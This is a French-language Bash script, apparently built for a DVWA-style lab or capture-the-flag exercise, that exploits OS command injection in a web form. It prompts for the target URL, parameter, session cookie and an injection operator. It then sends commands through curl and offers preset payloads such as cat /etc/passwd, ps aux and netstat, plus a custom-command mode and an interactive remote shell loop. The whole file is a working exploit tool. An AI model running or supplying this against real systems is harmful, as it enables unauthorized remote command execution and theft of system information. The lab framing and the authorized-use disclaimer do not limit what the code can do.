#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

print_title() {
    echo ""
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
}

print_info() {
    echo -e "${BLUE}[i] INFO:${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+] SUCCÈS:${NC} $1"
}

print_error() {
    echo -e "${RED}[-] ERREUR:${NC} $1"
}

print_result() {
    echo -e "${YELLOW}[*] RÉSULTAT:${NC}"
    echo ""
}

urlencode() {
    local string="$1"
    local length="${#string}"
    local encoded=""
    for (( i = 0; i < length; i++ )); do
        local c="${string:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) encoded+=$(printf '%%%02X' "'$c") ;;
        esac
    done
    echo "$encoded"
}

clear
echo -e "${CYAN}"
cat << "BANNER"
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║              COMMAND INJECTION EXPLOIT                ║
║                Version 1.0 - 2025                     ║
║                                                       ║
╚═══════════════════════════════════════════════════════╝
BANNER
echo -e "${NC}"

print_info "Outil d'exploitation de Command Injection"
print_info "À utiliser UNIQUEMENT sur des systèmes autorisés"
echo ""

print_title "CONFIGURATION DE LA CIBLE"

while true; do
    print_info "URL de la page vulnérable"
    print_info "Exemple: http://172.30.0.10/vulnerabilities/exec/"
    read -p "$(echo -e ${YELLOW}URL:${NC} )" TARGET_URL
    TARGET_URL="${TARGET_URL%#}"
    if [[ ! $TARGET_URL =~ ^https?:// ]]; then
        print_error "L'URL doit commencer par http:// ou https://"
        echo ""
    else
        print_success "URL: $TARGET_URL"
        break
    fi
done

while true; do
    print_info "Méthode HTTP utilisée par le formulaire"
    read -p "$(echo -e ${YELLOW}Méthode [GET/POST]:${NC} )" HTTP_METHOD
    HTTP_METHOD=${HTTP_METHOD^^}
    if [[ "$HTTP_METHOD" != "GET" && "$HTTP_METHOD" != "POST" ]]; then
        print_error "Méthode invalide"
        echo ""
    else
        print_success "Méthode: $HTTP_METHOD"
        break
    fi
done

while true; do
    print_info "Nom du paramètre vulnérable"
    print_info "Exemple: ip, host, target, etc."
    read -p "$(echo -e ${YELLOW}Paramètre:${NC} )" PARAM_NAME
    if [[ -z "$PARAM_NAME" ]]; then
        print_error "Le paramètre ne peut pas être vide"
        echo ""
    else
        print_success "Paramètre: $PARAM_NAME"
        break
    fi
done

print_info "Autres paramètres à envoyer? (ex: Submit=Submit)"
read -p "$(echo -e ${YELLOW}Paramètres supplémentaires [ENTER pour aucun]:${NC} )" EXTRA_PARAMS

print_info "Cookie de session (FORMAT: security=low; PHPSESSID=xxx)"
read -p "$(echo -e ${YELLOW}Cookie [ENTER pour aucun]:${NC} )" SESSION_COOKIE

if [[ -n "$SESSION_COOKIE" ]]; then
    if [[ ! "$SESSION_COOKIE" =~ security= ]]; then
        print_error "Cookie incomplet ! Format: security=low; PHPSESSID=xxx"
        read -p "$(echo -e ${YELLOW}Entrez le cookie complet:${NC} )" SESSION_COOKIE
    fi
    print_success "Cookie configuré"
fi

print_info "Valeur de base pour le paramètre"
print_info "Exemple: 127.0.0.1 pour un champ IP"
read -p "$(echo -e ${YELLOW}Valeur de base:${NC} )" BASE_VALUE

print_title "OPÉRATEUR D'INJECTION"

echo -e "${CYAN}Opérateurs disponibles:${NC}"
echo "  1. ; (point-virgule)"
echo "  2. && (ET logique)"
echo "  3. || (OU logique)"
echo "  4. | (pipe)"
echo "  5. \`cmd\` (backticks)"
echo "  6. \$(cmd)"
echo ""

while true; do
    read -p "$(echo -e ${YELLOW}Choisir opérateur [1-6]:${NC} )" OP_CHOICE
    case $OP_CHOICE in
        1) OPERATOR="; " ; OPERATOR_END="" ; break ;;
        2) OPERATOR=" && " ; OPERATOR_END="" ; break ;;
        3) OPERATOR=" || " ; OPERATOR_END="" ; break ;;
        4) OPERATOR=" | " ; OPERATOR_END="" ; break ;;
        5) OPERATOR=" \`" ; OPERATOR_END="\`" ; break ;;
        6) OPERATOR=" \$(" ; OPERATOR_END=")" ; break ;;
        *) print_error "Choix invalide" ; echo "" ;;
    esac
done

print_success "Opérateur configuré"

execute_command() {
    local cmd="$1"
    local payload="${BASE_VALUE}${OPERATOR}${cmd}${OPERATOR_END}"
    local encoded_payload=$(urlencode "$payload")
    
    if [[ "$HTTP_METHOD" == "GET" ]]; then
        if [[ -n "$EXTRA_PARAMS" ]]; then
            FULL_URL="${TARGET_URL}?${PARAM_NAME}=${encoded_payload}&${EXTRA_PARAMS}"
        else
            FULL_URL="${TARGET_URL}?${PARAM_NAME}=${encoded_payload}"
        fi
        if [[ -n "$SESSION_COOKIE" ]]; then
            response=$(curl -s -G "$FULL_URL" -H "Cookie: $SESSION_COOKIE")
        else
            response=$(curl -s -G "$FULL_URL")
        fi
    else
        if [[ -n "$EXTRA_PARAMS" ]]; then
            DATA="${PARAM_NAME}=${payload}&${EXTRA_PARAMS}"
        else
            DATA="${PARAM_NAME}=${payload}"
        fi
        if [[ -n "$SESSION_COOKIE" ]]; then
            response=$(curl -s -X POST "$TARGET_URL" --data-urlencode "${PARAM_NAME}=${payload}" --data "$EXTRA_PARAMS" -H "Cookie: $SESSION_COOKIE")
        else
            response=$(curl -s -X POST "$TARGET_URL" --data-urlencode "${PARAM_NAME}=${payload}" --data "$EXTRA_PARAMS")
        fi
    fi
    
    # Colore uniquement le contenu entre <pre> et </pre> en rouge
    echo "$response" | sed "s|<pre>|\x1b[0;31m|g; s|</pre>|\x1b[0m|g"
}

print_title "EXPLOITATION"

LOGFILE="/workspace/cmdinject_$(date +%Y%m%d_%H%M%S).log"
echo "=== COMMAND INJECTION LOG ===" > "$LOGFILE"
echo "URL: $TARGET_URL" >> "$LOGFILE"
echo "Date: $(date)" >> "$LOGFILE"
echo "" >> "$LOGFILE"

print_success "Log: $LOGFILE"
echo ""

while true; do
    echo ""
    echo -e "${CYAN}╔════════════════════ MENU ════════════════════╗${NC}"
    echo -e "${CYAN}║${NC} 1. Payloads pré-configurés                  ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC} 2. Commande personnalisée                   ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC} 3. Shell interactif                         ${CYAN}║${NC}"
    echo -e "${CYAN}║${NC} 4. Quitter                                  ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    
    read -p "$(echo -e ${YELLOW}Choix:${NC} )" MENU_CHOICE
    
    case $MENU_CHOICE in
        1)
            echo ""
            echo -e "${CYAN}=== PAYLOADS PRÉ-CONFIGURÉS ===${NC}"
            echo "  1. whoami"
            echo "  2. id"
            echo "  3. uname -a"
            echo "  4. pwd"
            echo "  5. ls -la"
            echo "  6. cat /etc/passwd"
            echo "  7. cat /etc/os-release"
            echo "  8. ps aux"
            echo "  9. ifconfig"
            echo " 10. netstat -tulpn"
            echo " 11. find / -name flag.txt 2>/dev/null"
            echo "  0. Retour"
            echo ""
            
            read -p "$(echo -e ${YELLOW}Choix du payload:${NC} )" PAYLOAD_CHOICE
            
            case $PAYLOAD_CHOICE in
                1) CMD="whoami" ;;
                2) CMD="id" ;;
                3) CMD="uname -a" ;;
                4) CMD="pwd" ;;
                5) CMD="ls -la" ;;
                6) CMD="cat /etc/passwd" ;;
                7) CMD="cat /etc/os-release" ;;
                8) CMD="ps aux" ;;
                9) CMD="ifconfig" ;;
                10) CMD="netstat -tulpn" ;;
                11) CMD="find / -name flag.txt 2>/dev/null" ;;
                0) continue ;;
                *) print_error "Choix invalide" ; continue ;;
            esac
            
            print_info "Exécution: $CMD"
            echo "Command: $CMD" >> "$LOGFILE"
            print_result
            result=$(execute_command "$CMD")
            echo "$result"
            echo "" >> "$LOGFILE"
            echo "$result" >> "$LOGFILE"
            echo "---" >> "$LOGFILE"
            ;;
            
        2)
            echo ""
            read -p "$(echo -e ${YELLOW}Entrez votre commande:${NC} )" CUSTOM_CMD
            if [[ -z "$CUSTOM_CMD" ]]; then
                print_error "Commande vide"
                continue
            fi
            print_info "Exécution: $CUSTOM_CMD"
            echo "Command: $CUSTOM_CMD" >> "$LOGFILE"
            print_result
            result=$(execute_command "$CUSTOM_CMD")
            echo "$result"
            echo "" >> "$LOGFILE"
            echo "$result" >> "$LOGFILE"
            echo "---" >> "$LOGFILE"
            ;;
            
        3)
            print_title "SHELL INTERACTIF"
            print_info "Tapez 'exit' pour quitter le shell"
            echo ""
            
            # BOUCLE INFINIE DU SHELL - NE SE FERME PAS APRÈS CHAQUE COMMANDE
            while true; do
                read -p "$(echo -e ${GREEN}shell>${NC} )" SHELL_CMD
                
                # Si l'utilisateur tape "exit", on quitte la boucle
                if [[ "$SHELL_CMD" == "exit" ]]; then
                    print_success "Fermeture du shell interactif"
                    break
                fi
                
                # Si commande vide, on recommence la boucle
                if [[ -z "$SHELL_CMD" ]]; then
                    continue
                fi
                
                # Exécute la commande et log
                echo "Shell: $SHELL_CMD" >> "$LOGFILE"
                result=$(execute_command "$SHELL_CMD")
                echo "$result"
                echo "$result" >> "$LOGFILE"
                echo ""
                
                # LA BOUCLE CONTINUE ICI - retour au prompt "shell>"
            done
            ;;
            
        4)
            print_success "Résultats sauvegardés: $LOGFILE"
            echo ""
            exit 0
            ;;
            
        *)
            print_error "Choix invalide"
            ;;
    esac
done
